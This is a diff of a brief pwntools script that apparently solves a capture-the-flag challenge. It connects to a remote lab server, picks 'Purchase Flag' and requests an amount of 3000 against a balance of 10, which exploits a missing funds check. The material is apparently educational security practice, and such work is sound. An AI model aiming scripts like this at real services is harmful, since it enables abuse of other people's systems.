@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
-import pwn
+from pwn import *
+import time
 
-if __name__ == '__main__':
-    server = "140.113.24.241"
-    port   = 30170
-    conn   = pwn.remote(server, port)
+# context.log_level = 'debug'
 
-    conn.recv().decode("utf-8")
-    conn.sendline(b'1')
-    conn.recvline().decode("utf-8")
-    conn.sendline(b'3000')
+conn = remote("140.113.24.241", 30170)
 
-    print(conn.recvline().decode("utf-8"), end = "")
-    print(conn.recvline().decode("utf-8"), end = "")
+conn.recvuntil(b'Welcome to the server:\nCurrent money: 10\n1. Purchase Flag\n2. Exit\nInput your choice:\n')
+conn.sendline(b'1')
+conn.recvuntil(b'Input the amount:\n')
+conn.sendline(b'3000')
+
+print(conn.recvline().decode("utf-8"), end = "")
+print(conn.recvline().decode("utf-8"), end = "")
